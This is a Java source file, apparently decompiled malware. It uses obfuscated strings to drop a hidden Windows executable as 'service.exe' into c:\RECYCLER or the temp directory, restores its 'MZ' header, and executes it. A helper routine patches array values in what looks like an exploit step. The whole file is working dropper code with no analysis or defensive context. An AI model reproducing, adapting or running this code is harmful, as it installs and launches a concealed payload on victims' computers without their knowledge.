import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

class Resp {
    public Resp(String paramString) {
        if (!Issue._isWin) {
            System.exit(0);
        }
        FileOutputStream fileOutputStream = null;

        String str = Issue.csfn("12312c123:123\\123R123E12C213Y423C45L6345E634345R\\65452321266142523"); // c:\\RECYCLER\\
        if (!createDir(str)) {

            str = System.getProperty(Issue.csfn("1234j432a453v134a453.643i23o45.234t54m652p234d54i234r5432245")); // java.io.tmpdir
            if (!str.endsWith("/") && !str.endsWith("\\")) {
                str = str + System.getProperty(Issue.csfn("file.separator"));
            }
        }
        str = str + Issue.csfn("324s23er34365v45i34c323e24.5555e544x234e"); // service.exe

        InputStream inputStream = getClass().getResourceAsStream(paramString);

        if (inputStream == null)
            System.exit(0);

        try {
            fileOutputStream = new FileOutputStream(str);
        } catch (FileNotFoundException fileNotFoundException) {
            System.exit(0);
        }
        byte[] arrayOfByte1 = new byte[2];
        byte[] arrayOfByte2 = new byte[256];

        try {
            int i = inputStream.read(arrayOfByte1);
            if (i == 2) {

                arrayOfByte1[0] = 77;
                arrayOfByte1[1] = 90;
                fileOutputStream.write(arrayOfByte1, 0, 2);
            }
        } catch (IOException iOException) {
        }

        while (true) {
            try {
                int i = inputStream.read(arrayOfByte2);
                if (i < 0) {

                    fileOutputStream.close();
                    inputStream.close();
                    break;
                }
                fileOutputStream.write(arrayOfByte2, 0, i);

            } catch (IOException iOException) {
            }
        }

        try {
            Thread.sleep(2000L);
            info1.funcRun(Issue.csfn("34125e5x34e23c"), str); // exec
        } catch (Exception exception) {
        }

        System.exit(0);
    }

    public static boolean createDir(String paramString) {
        File file = new File(paramString);
        if (file.exists())
            return true;
        if (!paramString.endsWith(File.separator))
            paramString = paramString + File.separator;
        if (file.mkdirs()) {
            return true;
        }
        return false;
    }

    public static int aLoop(int paramInt, Object[] paramArrayOfObject, int[] paramArrayOfint) {
        boolean bool = false;
        int i = paramArrayOfObject.length;
        for (int j = paramInt + 2; j < paramInt + 32; j++) {
            if (paramArrayOfint[j - 1] == i && paramArrayOfint[j] == 0 && paramArrayOfint[j + 1] == 0
                    && paramArrayOfint[j + 2] != 0 && paramArrayOfint[j + 3] != 0 && paramArrayOfint[j + 4] != 0
                    && paramArrayOfint[j + 5] == 0 && paramArrayOfint[j + 6] == 0) {

                int k = paramArrayOfint[j + 4];
                for (int m = j + 7; m < j + 71; m++) {
                    if (paramArrayOfint[m] == k) {

                        paramArrayOfint[m - 1] = paramArrayOfint[j + 3];
                        bool = true;
                        break;
                    }
                }
                if (bool)
                    break;
            }
        }
        return bool;
    }
}
